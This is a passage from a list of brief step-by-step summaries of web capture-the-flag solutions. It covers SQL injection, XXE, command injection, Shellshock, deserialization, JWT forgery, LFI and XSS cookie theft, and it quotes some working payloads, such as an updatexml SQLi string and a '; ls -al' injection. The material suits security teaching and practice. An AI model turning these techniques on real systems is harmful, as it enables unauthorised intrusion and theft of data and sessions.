    "Noticed that the PHP configuration has several functions disabled, but 'scandir' and 'file_get_contents' are not disabled",
    "Wrote a new PHP exploit using 'scandir' and 'file_get_contents' to browse through files in the '/etc' directory and find the flag which is meant to be in a file in that directory",
    "Created and uploaded the new PHP exploit",
    "Ran the PHP exploit and got the flag reading from a file in the '/etc' directory",
    "Flag was 'darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}'",
    "Connected to the provided web site and was presented with an authentication form displaying the user's IP.",
    "Examined the HTML source code of the page which revealed default credentials.",
    "Used the default credentials to login.",
    "Observed User-Agent details and an image printed as a response to the login.",
    "Attempted to alter the User-Agent during authentication and received a SQL error, therefore SQL injection via User-Agent string was possible.",
    "Decided to leak the database name but had to devise a new strategy as this query was of type 'INSERT'.",
    "Implemented an error-based approach using 'Updatexml()' in the SQL payload.",
    "Used the following payload: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #.",
    "Received an XPATH syntax error that contained the database name, which was used to compose the flag.",
    "Access the challenge website 'http://filereader.darkarmy.xyz/'",
    "Identify the upload form on the website",
    "Understand from the description that an XML External Entity (XXE) vulnerability might be involved",
    "Identify that the form only allows the uploading of PDF and DOCX files",
    "Upload a DOCX file and observe the output details, noting that the number of pages is shown",
    "Understand that DOCX files are actually a collection of XML files",
    "Create a new DOCX file and alter the file 'app.xml' inside it where the number of pages is stored",
    "Inject entity 'xxe' pointing to the required file 'file:///flag.txt' in the 'app.xml'",
    "Upload the modified DOCX file",
    "Once the website parses the XML and evaluates the 'xxe' entity, it will display the content of the '/flag.txt' file",
    "Accessed the provided URL to check the PHP source code",
    "Saw the criteria for getting the flag printed",
    "Identified the necessary conditions to be satisfied according to the code. It includes specific query string parameters, a user-agent, and a 'GET' request that needs to have two different parameters having the same md5 hash",
    "Understood from the code snippet that the md5 hash must collide. This means two different strings should give the same md5 hash",
    "Used provided hexadecimal values to generate two different strings with the same md5 hash",
    "Used 'hex2bin' PHP function to convert the hexadecimal values into binary data",
    "Checked whether the generated data from both the hexadecimal values is the same or not",
    "Generated the md5 hash for both binary data and checked if they matched",
    "URL encoded both binary strings",
    "Got two different URL encoded strings with the same md5 hash",
    "Constructed the complete 'GET' request using all the relevant parameters including the 'darkctf', 'ctf2020', 'karma', and '2020' query parameters and set the 'User-Agent' as required by the PHP code",
    "Sent the 'GET' request to the provided web page",
    "Received the flag as the response",
    "Visited the challenge URL 'http://freewifi.ctf.umbccd.io/'",
    "Analyzed the HTML code of the page and found out that the guest sign in portal was not yet implemented",
    "Analyzed the provided PCAP file and identified a packet (#6) that points to a different URL 'https://freewifi.ctf.umbccd.io/staff.html'",
    "Accessed the new URL 'https://freewifi.ctf.umbccd.io/staff.html' and found the flag",
    "Identify two cookies in the system: JWT 'identity'=31337' and 'JWT 'secret'='dawgCTF?heckin#bamboozle'",
    "Identify two packets, #261 and #263, in the capture related to a JWT-related endpoint",
    "Intercept a GET request to /jwtlogin that returns an HTTP 401 UNAUTHORIZED status",
    "Use tools such as jwt.io to craft a valid JWT with `31337` identity and signed with `dawgCTF?heckin#bamboozle` secret",
    "Send another GET request to /jwtlogin with the crafted JWT in the `Authorization` header",
    "Receive the flag in the response from the server",
    "Accessed the challenge URL: http://freewifi.ctf.umbccd.io/",
    "Encountered a login page with two authentication options: either with a username and password or a WifiKey.",
    "Analyzed the HTML to find possible vulnerabilities. A CSRF token was observed that may indicate a potential CSRF vulnerability.",
    "Analyzed a provided PCAP file and found POST requests to a '/forgotpassword.html' page.",
    "Through the PCAP analysis, identified the user 'true.grit@umbccd.io' and learned about the 'forgot password' functionality and how it works.",
    "Identified a JavaScript that copied the email value entered in the input field to the username field.",
    "Manipulated the JavaScript by intercepting the Post Request and replaced the email value with a controlled one, keeping the known username ('true.grit@umbccd.io') intact.",
    "Observed the response for the manipulated request which returned a success message.",
    "Found the flag hidden in the response: 'DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}'.",
    "Connect to the website and check the cookies being set",
    "Download and analyze the PCAP file for POST requests passing 'passcode' values",
    "Identify the algorithm mentioned in the cookie value and apply it to the wifi nonces captured",
    "Discover that 'passcode' values are the first 8 characters of the hashed 'nonce' value",
    "Apply the same process to the challenge's 'nonce' value",
    "Perform a POST request with the calculated 'passcode'",
    "Retrieve the flag from the response page",
    "Visited the provided URL",
    "Inspected the source code of the website",
    "Located an image tag with a suspicious URL parameter labelled 'flag'",
    "Retrieved the flag from the URL parameter",
    "Visited the given URL in the challenge",
    "Inspected the source code of the webpage and found an image tag with an onclick track event",
    "Found a JavaScript event in the onclick attribute which returned an encoded string",
    "The encoded string contained the ASCII representation of the flag",
    "Used a JavaScript console in the web browser to decode the ASCII to a readable text which gave the flag",
    "Found a target website with a login form having JavaScript check",
    "Identified that the JavaScript check was being used to prevent the submission of long passwords",
    "Discovered that the script could be bypassed by disabling JavaScript from the browser or by using a proxy tool to intercept and repeat the request",
    "Entered a common password, for example, 'password', bypassing the JavaScript check",
    "Retrieved the flag successfully from the website",
    "Accessed the website and observed allowed actions: upload and comment on dog pictures",
    "Found an interesting endpoint '/dogooo/runcmd' enabling remote shell functionality that was blocked due to 'seccomp' filter preventing 'execve'",
    "Identified several functionalities accessed by authenticated users by spotting '@login_required' annotations",
    "Found and endpoint for creating new users '/dogooo/user/create' which is also accessed only by authenticated users",
    "Publicly accessible functionality: '/dogooo/deets/<postid>' where comments under a picture can be inserted is identified",
    "During the submission of comment, a two-step process of inserting the comment like a preview and then validating and inserting into the database is observed",
    "In the 'get_comments' function within the [loaddata.py](loaddata.py) file, a code snippet that prints 'self.__dict__' if a comment text contains a format string like '{rating}' is found",
    "Post content prints out with 'self.__dict__' in the preview of the webpage on trying the above method",
    "Using the '{rating[comments][0].__class__.__init__.__globals__}' format string, 'globals' objects can be accessed",
    "Database credentials are found in the output ('dogooo' for 'db_user' and 'dogZgoneWild' for 'db_pass')",
    "Authenticating into the system with these credentials allowed for new users creation",
    "Authenticated to the system and found that the 'login' method in [dogooo_comments.py](dogooo_comments.py) uses Python 3's f-Strings functionality which can be used to call methods",
    "Spot that during authentication, 'get_user_info' method of the User class in [loaddata.py](loaddata.py) uses the 'f()' method on the 'username' field which can be exploited for login",
    "Create a new user with a malicious username '{open('/flag').read()}' that could trigger a Remote Code Execution during the authentication",
    "On authenticating with this user, redirected to a URL containing the flag",
    "Identified the flag from the URL: 'OOO{did you see my dog}'",
    "Accessed the web application and submitted a text content to a remote S3 bucket defining a GUID for the key and then retrieved the same text content via the GUID.",
    "Examined the application's functionality endpoint '/files/'. Introduced the GUID via the 'X-guid' HTTP header.",
    "Analyzed the provided files (app.py and store.py), confirming no intentional vulnerabilities within.",
    "Investigated the responses received, paying particular attention to some intriguing HTTP headers: 'Server', 'Via', 'X-Served-By'.",
    "Interpreted that the architecture consists of a proxy ('haproxy' 1.9.10) and several hosts behind it ('gunicorn' 20.0.0), which operate the app.",
    "Understood the potential of an 'HTTP Desync Attack' CL.TE scenario from viewing the backend infrastructure.",
    "Crafted a malicious HTTP request including a special character between 'Transfer-Encoding:' and 'chunked' for a possible request smuggling attack.",
    "Received a successful response from the webserver, indicating the attack has worked.",
    "Executed a GET request to read the item that was created from the request smuggling.",
    "Retrieved a POST request that contained the final flag in the response.",
    "Recognize the challenge requires locating a flag in /var/www/html/flag.php on a web server",
    "Identify the PHP source code provided that includes a User Submitted file inclusion vulnerability",
    "Craft a POST request to target this vulnerability and include /var/www/html/flag.php",
    "Send the crafted POST request to the server",
    "Receive an HTTP response containing the Flag",
    "Analyzed the source code of the app provided in the challenge",
    "Understood the user registration process, where data is packed in the format 'username:password:admin'",
    "Discovered that the value 'false' is forced into the admin field during the normal registration process",
    "Found that there were no escaping countermeasures for the ':' character",
    "Crafted and injected a record by passing a password with a ':' character to bypass the 'false' value, thus creating an admin account",
    "Registered with the username 'm3ssap0' and password 'pwnd:true'",
    "Logged in with the newly created admin account and retrieved the flag",
    "Analyzed given PHP script to understand the functionality of different methods.",
    "Identified the target 'config.php' file and inferred it must be printed via curl execution.",
    "Understood that to trigger curl execution, 'doit' method must be invoked.",
    "Noted that the 'doit' method is called in the '__destruct()' function if present in the '$method' attribute of the destructed object.",
    "Decided to exploit 'unserialize' method to craft an object with desired parameters.",
    "Created a PHP script to serialize an object for the exploit.",
    "Adjusted the '$method' attribute in the serialized object to be 'doit'.",
    "Updated the '$url' attribute in the serialized object to bypass localhost address checks by setting it to 'file:///var/www/html/config.php'.",
    "Used known strange PHP behavior to circumvent file extension checks on '.php' by replacing '.' character with '%252e'.",
    "Adjusted payload produced from serialization operation because of the replace operation which changed the string length.",
    "URL-encoded the payload and updated length of URL string according to the previous string replacement.",
    "Made a GET request with the payload.",
    "Received flag 'F#{wtf_5trp0s_}' in response.",
    "Connect to website and analyze HTML which results in a link to the source code",
    "Connect to source code link to reveal the structure of the site",
    "Find that the service functions similarly to Pastebin, allowing the creation and sharing of messages",
    "Understand that exploitation of the website involves creation of a Stored XSS to exfiltrate the session cookies",
    "Find that content of the note is reflected in the source code and inserted into the HTML",
    "Note that the const 'note' can be altered by closing the string and inserting arbitrary JavaScript",
    "Create a working XSS by crafting a precise content payload",
    "Start a listening host with 'nc -lkv 1337'",
    "Craft a request which will manipulate the HTML structure, creating an insertion point",
    "Craft another post request to create a secondary note, passing the malicious note_id from the previous step",
    "Receive the flag from the listening host",
    "Read the blog post in the home page of the challenge URL",
    "Found the 'robots.txt' file at 'http://challs.houseplant.riceteacatpanda.wtf:30003/robots.txt'",
    "Discovered the admin page at 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin' by reading the 'robots.txt' file",
    "Examined the HTML source code in the admin page, found a comment hinting towards a potential vulnerability using TOTP",
    "Tried changing the input field from 'password' to 'totp' but it didn't work",
    "Discovered that the username was 'bob' by observing that authentication replies with 'User not found' for nonexistent users and 'Login failed' otherwise",
    "Analysed the websockets traffic by observing the post retrieval packets",
    "Identified that the second part of the packet is the post ID, and is sent as a URL fragment",
    "On examining the client-side code, discovered that 6 parameters: 'author', 'hidden', 'id', 'postDate', 'text', 'title' are read from the server response",
    "Attempted a SQL Injection on data passed using fragment values",
    "Used SQL Injection to read 'username' from 'users'; discovered from 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,username,null,null,null,null/**/from/**/users'",
    "Used SQL Injection to read all posts from 'posts'; discovered from 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts'",
    "Obtained the flag as 'rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}'",
    "Started the CTF Challenge in Houseplant CTF 2020 – Fire/place which fell under the web category and was worth 1783 points",
    "Given the instruction that there is something inside the HTML page",
    "Given fire-place[0].html e4a4c2321d18246d027184605ca52866 as the challenge",
    "Downloaded the provided HTML file",
    "The HTML file connected to a Firestore environment",
    "The Firestore environment contained a canvas in which users could color pixels which get stored into Firestore repository",
    "Opened the browser console to interact with Firebase installation",
    "Analyzed the client source code and read the official Firebase Firestore documentation",
    "Used the provided code snippet to retrieve data from each document in Firestore",
    "The retrieved data was found to be structures containing all the RGB values for pixels",
    "Tried accessing a document called 'flag'",
    "The retrieved data from the 'flag' document contained the lyrics of a song and the required flag",
    "Found the flag to be 'rtcp{d0n't_g1ve_us3rs_db_a((3ss}'",
    "Recognized that the challenge name and challenge statement hinted at SQL injection",
    "Visited the webpage which had an authentication form",
    "Found an interesting comment in the HTML source code: '?sauce'",
    "Accessed a new webpage 'http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce'",
    "Saw the webpage's source code, which is PHP",
    "Noticed that the PHP code showed that 'flagman69' username would output the flag",
    "Identified that the webpage is vulnerable to SQL injection as the query in the PHP code was concatenating user input directly",
    "Identified additional control which prevents SQL injection if password contains the number '1'",
    "Tried to bypass password check with SQL injection but found that the flag did not print even though the login was successful",
    "Identified that the webpage might not have the 'flagman69' user",
    "Tried using the 'UNION' clause in the SQL injection to search for the 'flagman69' user",
    "Found that the 'users' table had 3 columns and the second column contained the usernames",
    "Crafted a new SQL injection that directly passed 'flagman69' as the username column value using the 'UNION' clause",
    "Used the new SQL injection, got authenticated as 'flagman69' and received the flag.",
    "Analyzed the HTML source code, found the endpoint of the QR code service",
    "Identified that the QR Code produced only contains the first character inserted",
    "Used backticks to confirm RCE by sending the `echo 'X'` command and receiving a QR code of the `X`",
    "Wrote a Python script to exfiltrate the output of executed commands",
    "Created a function `execute_command` in the Python script to run commands, increasing the command output slice index until the result was empty",
    "Created a function `http_get` in the Python script to get the response, checking if PNG was found in the response",
    "Launched remote commands using the Python script",
    "Used the script to check \"whoami\", list the files, and retrieve the flag in the file \"flag.txt\"",
    "Accessed the given URL, to review the source code of the homepage.",
    "Clicked on the link to enter the chat.",
    "Upon redirection, chose 'discord' as the OAuth2 Identity Provider.",
    "Recognized that the 'with' HTTP GET parameter could be manipulated.",
    "Replaced the existing 'with' value, 'discord', with a different value, 'foo'.",
    "Received an HTTP 200 OK status code, as expected.",
    "Replaced the 'with' value with the word 'flag'.",
    "Followed the redirection link after replacing the 'with' value with 'flag'.",
    "Viewed the page with the flag, 'rtcp{rtcp-*is-s/ort-of-se1fh0st3d}'.",
    "Accessed challenge PHP URL and reviewed presented source code",
    "Identified need to bypass server checks to access flag",
    "Crafted serialized input to pass via 'id' HTTP GET parameter through certain PHP code",
    "Created PHP payload to bypass server checks, ensuring both the user's name and password would be equal to the secret",
    "Built URL to pass payload as parameter",
    "Received partial flag after successful bypass of initial server checks",
    "Identified additional server check constraints for an additional GET parameter 'caption'",
    "Researched ways to bypass PHP constraints",
    "Introduced additional PHP code to bypass further server checks and execute contents of another HTTP GET parameter",
    "Perfected payload for eval instruction",
    "Added GET parameter to final URL, calling a specific function",
    "Accessed flag after successful bypass of all server checks",
    "Inspect the source code of the website to know what server-side checks are being done",
    "Study the source code and identify that there are checks for specific patterns that will allow or block request",
    "Identify that the first check points to a GET parameter with underscores but query string cannot have underscores",
    "Research if and how PHP manipulates input parameters' names to remove whitespaces and convert characters into underscores",
    "Write a PHP program to check if characters are converted to underscores and enumerate these characters",
    "Use the output of the script to craft a URL with the identified character",
    "Check the website response with this newly crafted URL",
    "Analyze the remaining check in the source code to bypass it",
    "Research if it is possible to bypass the 'ereg' instruction by injecting a NULL byte",
    "Formulate the final URL by injecting a NULL byte and the necessary characters",
    "Use this final URL to solicit a response from the server, successfully bypassing the checks in the source code",
    "Capture the flag from the server response",
    "Initialized CTF task and noticed the name 'We will we will Shock You' as a hint towards Shellshock vulnerability.",
    "Cited the page http://104.197.168.32:17012/index.html as the challenge target with an Apache2 default index.",
    "Analyzed the HTML source of the page to find any hidden or obscured data.",
    "Found a commented item in the HTML source of the page: <!-- bashferno.cgi -->.",
    "Requested http://104.197.168.32:17012/bashferno.cgi and received HTML content suggesting Shellshock vulnerability.",
    "Tried to exploit Shellshock by injecting commands via 'User-Agent' HTTP header using curl command.",
    "Successful execution of 'id' command confirmed remote command execution vulnerability.",
    "Executed '/bin/ls .' to list the contents of the current directory on the Challenge server.",
    "Identified a file 'flag_for_this_INFERNO.txt' in the listed contents indicative of the flag for the challenge.",
    "Accessed the URL http://104.197.168.32:17012/flag_for_this_INFERNO.txt to retrieve the flag.",
    "Confirmed text 'infernoCTF{F33l_Th3_Sh0ck}' in the accessed file as the final flag of the challenge.",
    "Accessed the challenge website with the given URL",
    "Observed a form field requesting an IP address to execute a ping command",
    "Identified a vulnerability in the form due to command execution via shell",
    "Injected a command to list all files and directories using '127.0.0.1; ls -al' in the IP address field",
    "Used the directory listing to identify a 'print-flag' file and downloaded it by accessing 'http://lowdeep.insomnihack.ch/print-flag'",
    "Used the 'strings' command to extract the flag from the binary data in the 'print-flag' file",
    "Identified the flag: 'INS{Wh1le_ld_k1nd_0f_forg0t_ab0ut_th3_x_fl4g}'",
    "Connected to the challenge website",
    "Saw a message indicating the ability to upload, list, and view LaTeX documents",
    "Identified potential for XSS due to unsanitized input field and unescaped output upon viewing uploaded documents",
    "Uploaded a LaTeX document containing a script for a basic alert as a proof-of-concept for XSS vulnerability",
    "Confirmed vulnerability by uploading another LaTeX document, this time a script to alert the document's cookies",
    "Noted the output shown upon submitting an article, including a reference to a potentially fake flag and the session info",
    "Discovered an HTML comment about an unlinked source file, and downloaded this file",
    "Analyzed the downloaded source code, discovered a conditional statement that sets a cookie with the true flag if certain values are present",
    "Decided to forge the cookies with obtained information: the fake flag and the admin's PHP Session ID",
    "Accessed the list functionality with the spoofed cookies",
    "Obtained the real flag within the FLAG cookie",
    "Connect to the website at http://10.255.0.1:8010/",
    "Register a user and analyze the cookies to find the `login` cookie with base64 content",
    "Decode the base64 content to reveal a PHP serialized class",
    "Craft a malicious serialized class with escalated privileges",
    "Encode the malicious serialized class in base64",
    "Replace the existing `login` cookie with the new base64 encoded malicious payload",
    "Visit the private section of the website with the modified cookie to get the flag",
    "Accessed the website which provides a functionality to create a custom cowfile via the following URL: `http://3.93.128.89:1204/cow_designer`. The cowfiles are script files that utilize the cowsay command to print messages.",
    "Devised a strategy to manipulate the content of the cowfile. Realized that the submitted string is appended after '$the_cow' variable in the script.",
    "Created a code snippet: `EOCA$eyes=`ls`;print '$eyes';` to potentially gain information about the directory. It was noted that the 'A' placeholder in the code has to be replaced with `\\n (`0x0a`) in a proxy.",
    "Sent an HTTP POST request to utilize the code snippet via the /cow_designer page to list the directory content. Discovered files in the directory, including the 'flag' file, amongst others.",
    "Created another Perl code snippet to read the contents of the file named 'flag'. The snippet (`EOC\n$eyes=`cat flag`;print '$eyes';`) was injected through another HTTP POST request to /cow_designer.",
    "Received the contents of the 'flag' file in the HTTP response, which contained the flag: `AOTW{th3_p3rl_c0w_s4ys_M0oO0o0O}`",
    "Open the URL with a browser, note it redirects to Google",
    "Use the curl command to GET the page",
    "Note the returned HTML and the allowed HTTP operations: 'GET', 'POST', 'HEAD', 'OPTIONS'",
    "Use the curl command to POST the page",
    "Take note of the returned JavaScript code",
    "Rewrite the returned JavaScript code in a more readable format",
    "Modify the previous code to print the reversed string",
    "Run the written JavaScript",
    "Observe the output, noting it as the flag",
    "Sent a GET request to the provided URL: http://35.222.174.178/maria/. Observed an SQL query at the start of the HTML page returned, attributing the user's IP address to an SQL query, indicating possible SQL injection vulnerability.",
    "Passed an arbitrary character(',') into the X-FORWARDED-FOR HTTP header to manipulate the IP address parameter in the SQL query. The returned error message suggests that the database used is an SQLite database.",
    "Determined that the result of the SQL query was used to populate the PHPSESSID cookie by analyzing the HTTP responses.",
    "Created a UNION SQL operation with 'null' in order to determine the user table and the number of columns that need to be unioned.",
    "Determined the position of the column used to return data, it was found to be the last one.",
    "Discovered the presence of only two tables - nxf8_users and nxf8_sessions.",
    "Enumerated the columns of the user table by passing a SQL command into the X-FORWARDED-FOR header.",
    "Analyzed the composition of the sessions table and found the 'user_id' column needed a foreign key from the user table.",
    "Retrieved the 'id' of Maria from the user table.",
    "Located Maria's session ID by querying the 'nxf8_sessions' table for session IDs where 'user_id' is 5.",
    "Modified the PHPSESSIONID cookie in the browser to Maria's session ID to impersonate her.",
    "Refreshed the page to reveal the flag 'aj9dhAdf4'.",
    "Clone S3Scanner from GitHub repository using 'git clone https://github.com/sa7mon/S3Scanner.git'",
    "Navigate to the S3Scanner directory using 'cd S3Scanner/'",
    "Modify permissions of s3scanner.py to make it executable using 'chmod u+x s3scanner.py'",
    "Install the required dependencies for s3scanner using 'pip install -r requirements.txt'",
    "Use S3Scanner to dump the contents of the suspect S3 bucket using 'python3 ./s3scanner.py --dump bucketsoffun-ctf.s3-website-us-east-1.amazonaws.com'",
    "Navigate into the bucket directory using 'cd buckets/bucketsoffun-ctf/'",
    "View the contents of the directory using 'll'",
    "Use the 'cat' command to display the contents of youfoundme-asd897kjm.txt",
    "Connected to the website and experienced multiple redirections from one page to another",
    "Each page had one letter for the name",
    "Analyzed the requested pages and tuned the starting point of the redirection",
    "Discovered the full flag one character at a time",
    "The flag was 'RS{4!way5_Ke3p-m0v1ng}'",
    "Connected to http://ctfchallenges.ritsec.club:3000, received a message that this page is for authentication with an API located at port 4000.",
    "Connected to http://ctfchallenges.ritsec.club:4000, received API documentation including the endpoints: /api/admin and /api/normal.",
    "Attempted to connect to http://ctfchallenges.ritsec.club:4000/api/normal, received an error: Forbidden, missing JWT authorization.",
    "Made a GET request to http://ctfchallenges.ritsec.club:3000/auth specifying the name as m3ssap0 and received a JWT(token).",
    "Decoded the JWT to understand its format, found out that it has only user privileges.",
    "Used the obtained JWT to authenticate using the /api/normal endpoint, received a message stating flags are not for normal users.",
    "Attempted to use the /api/admin endpoint using the obtained JWT, received a message that the user is not an admin.",
    "Discovered a comment from the API documentation page's HTML source hinting about a robots.txt file located at http://ctfchallenges.ritsec.club:3000/robots.txt.",
    "In the robots.txt file, found that /signing.pem is disallowed.",
    "Made another GET request to obtain the signing certificate from the platform.",
    "Altered the JWT's header to change the algorithm to HS256, and payload to change the user type to admin.",
    "Used the signing certificate to generate a new HMAC signature and appended it to the header and payload.",
    "Created a new JWT which is a combination of the altered header, payload, and the generated signature.",
    "Made a GET request to the /api/admin endpoint with the new JWT, received the flag: RITSEC{JWT_th1s_0ne_d0wn}.",
    "Connect to the provided website",
    "Discover an HTML comment hinting at two more pages: upload.php and photos.php",
    "Recognize that the web application allows image uploads and displays them in a gallery",
    "Understand that the upload functionality is vulnerable as it does not verify the content of the image or convert it to remove unwanted content",
    "Realize that a shell can be inserted into an image",
    "Duplicate an image file and rename it to indicate it contains a shell",
    "Use the exiftool to insert PHP code into the DocumentName of the image that can execute commands remotely",
    "Upload the manipulated image file to the web application",
    "Determine the renamed file path of the uploaded image",
    "Use the remote command execution vulnerability to list directories in the root location",
    "Use the vulnerability to search the entire file system for any file named 'flag'",
    "Find a flag.txt file in the /home directory",
    "Use the vulnerability to display the content of the flag.txt file",
    "Retrieve the flag from the content of the flag.txt file",
    "Access the given URL and study the game",
    "Download the provided PHP files as part of the CTF challenge",
    "Analyze the source code within 'play.php'",
    "Identify vulnerability to a SQL Injection within the query",
    "Test the vulnerability with a payload consisting of a special SQL statement",
    "Identify that this successfully runs a SQL query and returns different messages based on query results",
    "Verify that the above indicates a Blind SQL Injection vulnerability",
    "Realize that, due to limitations on the maximum attempts from the same IP address before a reset, the IP address used to generate the token cannot be used to extract it",
    "Decide to generate the token from one IP, then switch to a different IP to discover the generated token",
    "Craft a SQL query to extract the data from the different IP address",
    "Write a Python script to discover the token by generating payloads with the SQL query to extract each character of the token",
    "Follow the Python script's process of resetting the session, generating and testing the payload, and increasing the sleep time between requests to avoid detection or session resets",
    "Enter the discovered full token into the provided form field using the original token-generating IP address",
    "Access the provided URL to submit the form and retrieve the flag",
    "Visited URL: https://web0.ctfsecurinets.com/ and tried to access common pages like foo.php",
    "An error page popped up, accessed Symfony profiler interface",
    "Located a line of PHP code that pops up an interesting file within the error logs: require dirname(__DIR__).'/config/bootstrap.php';",
    "Connected to `https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php' and found the entire path to an environment file",
    "Inside the PHP environment file, located one more environment: /secret_ctf_location/env",
    "Visited `https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env' to print the content of the environment file",
    "Inside the environment file, found the flag",
    "Access website hosting CTF.",
    "Find and examine feedback form on website.",
    "Inspect source code on feedback form page and discover feedback is sent via XML composed by JavaScript.",
    "Observe that server responds with a message including the author of the feedback.",
    "Identify application is vulnerable to XXE and that 'author' field can be used to execute attack.",
    "Send POST request to /feed.php with XML code structured to expose data from /etc/passwd file.",
    "Get response confirming successful exposure of /etc/passwd file.",
    "Assess remote code execution isn't possible.",
    "Attempt to find current working directory to spot flag file.",
    "Utilize '/proc/self/' directory to access reference to current working directory: 'cwd/'.",
    "Send second POST request to /feed.php with XML code designed to expose flag file from current working directory.",
    "Receive response confirming successful staging of attack.",
    "Extract flag from response.",
    "Connect to https://web5.ctfsecurinets.com/flags.php",
    "Analyze the source files and spot code vulnerable to SQL injection in index.php",
    "Identify that the vulnerability exists because the username taken from the session is not properly sanitized",
    "Find that the username is used after authentication",
    "Create a malicious input for the username to pull the details of the user with the proper role",
    "Register a user with the malicious username input",
    "Login with the registered user once, logout, then re-login to find the details of the desired user under the post search section",
    "Log in with the found user: username: 'root' and password: 'jjLLgTGk3uif2rKBVwqH'",
    "Connect to https://web5.ctfsecurinets.com/flags.php with the username and password to reveal the flag",
    "Created a local repository and initialised a local Bazaar repository.",
    "Made the first commit to the repository, then removed the first file created.",
    "Downloaded the 'last-revision' file from the target server.",
    "Downloaded the 'dirstate' file from the target server.",
    "Downloaded the 'pack-names' file from the target server.",
    "Used the BZR Check command to find any missing files and downloaded files from the target server.",
    "The script was set to continue downloading missing files until no more missing files were detected.",
    "Recovered the missing source files using Bazaar's 'revert' command.",
    "Started searching each revision with adjusted script to identify any differences made.",
    "Identified two distinct changes to the 'index.php' file in two separate revisions.",
    "First change contained a Base64 encoded string within a block of HTML code.",
    "Converted the Base64 string into hexadecimal format. Identified as a Bitcoin Wallet password.",
    "Second change contained an Hexadecimal string within HTML comment tags.",
    "Identified this hexadecimal string as the AES ECB key for decoding the Bitcoin Wallet password.",
    "Used the OpenSSL tool to decode the Bitcoin Wallet password, providing the AES ECB key and hex string as input.",
    "Decoded string revealed to be the flag.",
    "Observed the blog and identified that the owner is a fan of Canonical and its product, Bazaar.",
    "Attempted to connect to the '.bzr' directory and received a 'HTTP 403 Forbidden' error, suggesting the presence of the folder.",
    "Connected to the 'README' file in the '.bzr' directory and confirmed the existence of a Bazaar repository folder.",
    "Connected to 'last-revision' in the 'branch' folder within '.bzr', revealing the last revision.",
    "Created a new directory named 'ctf-bzr' and initialized a Bazaar repository.",
    "Created a 'foo.txt' file, added it to the repository, committed changes and then removed it.",
    "Downloaded the 'last-revision' file from the target server and replaced the existing 'last-revision' file.",
    "Downloaded the 'dirstate' file from the 'checkout' folder and replaced the current 'dirstate' file.",
    "Downloaded the 'pack-names' file from the 'repository' folder and replaced the current 'pack-names' file.",
    "Ran 'bzr check' command which triggered an error revealing the missing files.",
    "Downloaded the missing repository files as indicated by the error.",
    "Checked the repository status using 'bzr status' command, revealing a removed 'index.php' file.",
    "Used 'bzr revert' to recreate the 'index.php' file, which contained the flag.",
    "Connected to the website 138.247.13.115 and received a message indicating site is not served on this interface",
    "Identified the website was under HTTPS, but the certificate seemed invalid",
    "Analyzed the certificate and discovered it was created for the host 138.247.13.115.xip.io",
    "Connected to the website 'https://138.247.13.115.xip.io/' where the flag was displayed",
    "Visited the website",
    "Identified that the website simulates a TODO list application",
    "Understood that TODO notes of users can be read by enumerating URLs in a certain format",
    "Assumed that one of these notes contains the CTF flag",
    "Wrote a Python script to automate the URL enumeration and flag discovery",
    "The script loops through a range of integers, replacing each into a URL and calling the web page",
    "If the page content contains 'MCA{' (indicating the presence of a flag), the content is printed and the loop breaks",
    "Any HTTP error during the page request is printed",
    "In between each iteration, the script pauses for a random interval between 1 to 4 seconds",
    "Ran the script and obtained the flag 'MCA{al3x4_5et_a_r3minder}'",
    "Opened the link provided in the CTF challenge - http://138.247.13.111",
    "Observed a web page which performs a password reset function using security questions, related to Alan Turing's account recovery",
    "Noticed that incorrect answers submitted in the form fields are highlighted in red",
    "Performed internet searches concerning Alan Turing's life to gain the necessary information to answer the recovery questions",
    "Determined the correct answers to the security questions",
    "Entered the following answers in their respective text fields: 'Stoney' for Mother's Maiden Name, 'St. Michael's' for First School Attended, 'Science' for Favorite Primary School Subject, 'Marathon' for Favorite Olympic Event, and '1' for 2 + 2 - 3 = ?",
    "Checked 'Is it a leap year?' and 'I agree Security Questions are Bad.' checkboxes",
    "Obtained the flag from the webpage which reads: MCA{sms_2fa_is_bad_also}",
    "Connected to the provided URL, which is a file sharing site",
    "Discovered the website takes a 'name' parameter",
    "Analyzed read files page and discovered that the website is vulnerable to LFI (local file inclusion)",
    "Exploited LFI vulnerability to discover how the website stores the 'name' parameter",
    "Learned that the 'name' parameter is stored using PHP serialization and can be located in the '/proc/self/fd/9' file",
    "Realized that if LFI is used to read a file including PHP code, it will be executed by the server",
    "Passed a PHP command for the 'name' parameter (which is a command to display the ID of the current process) ",
    "Used LFI to execute this php command, returning the process ID",
    "Used the 'ls -al' command to enumerate the directory's files",
    "Discovered a 'flag_is_here' directory in the root directory",
    "Enumerated the 'flag_is_here' directory",
    "Found a 'flag.txt' file in the 'flag_is_here' directory",
    "Read the contents of the 'flag.txt' file, which is the flag",
    "Access the website of the challenge",
    "Notice the website contains only a login form that might be vulnerable to SQL injection",
    "Perform an SQL injection attack on the login form using a basic SQL injection payload",
    "Note that the initial SQL injection tactic yielded access but not the password",
    "Modify the SQL injection query to check if the password is the flag",
    "Understand that this approach seems to be working but manual checks are not efficient",
    "Write a Python script that automates this process and will easily exfiltrate all password characters via blind SQL injection",
    "Run the script to retrieve the password for the flag: gigem{h0peYouScr1ptedTh1s}",
    "Accessed the website: http://toomanycredits.tamuctf.com",
    "Identified an interaction with the website that involves a 'counter' cookie",
    "Evaluating sequential requests determined that this the 'counter' cookie string ends with a changing base64 encoded string",
    "Realized that removing a portion of the 'counter' cookie triggers a zlib Input Error",
    "Recognized Java Serialization notation at the start of the base64 decoded string",
    "Determined the 'value' attribute, which corresponded to the count of credits, is at the end of the Java serialized object",
    "Crafted a malicious Java serialized object with a large 'value' to speed up the process",
    "Compressed and encoded to Base64 the malicious Java serialized object",
    "Submitted an HTTP request with the modified cookie",
    "Received a page showing successful entry and the flag",
    "Visited the link provided in the challenge",
    "Submitted the form presented on the webpage",
    "Observed the cookie 'not_admin' with a value of '1' after form submission",
